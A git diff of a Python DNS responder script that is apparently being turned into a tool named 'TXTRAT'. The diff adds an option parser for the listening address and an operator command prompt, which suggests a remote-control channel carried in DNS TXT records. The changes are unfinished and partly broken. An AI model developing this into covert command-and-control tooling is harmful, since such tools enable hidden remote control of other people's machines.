@@ -1,10 +1,6 @@
 import socket, glob, json
-
-port = 53
-ip = '172.16.150.34'
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock.bind((ip, port))
+import optparse
+import readline
 
 def load_zones():
 
@@ -189,8 +185,35 @@ def buildresponse(data):
     return dnsheader + dnsquestion + dnsbody
 
 
-while 1:
-    data, addr = sock.recvfrom(512)
-    r = buildresponse(data)
-    sock.sendto(r, addr)
+def main():
+
+    port = 53
+    ip = '127.0.0.1'
+
+    usage = "TXTRAT"
+    parser = OptionParser(usage = usage)
+
+    # IP address
+    parser.add_option(
+        "-a",
+        "--address",
+        help = "IPv4 address to set as listener",
+        action = "store",
+        type = "string",
+        dest = "address"
+    )
+
+    (options, args) = parser.parse_args()
+
+    ip = options.address
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind((ip, port))
+
+    command = raw_input("input: ")
+
+    while 1:
+        data, addr = sock.recvfrom(512)
+        r = buildresponse(data)
+        sock.sendto(r, addr)
 
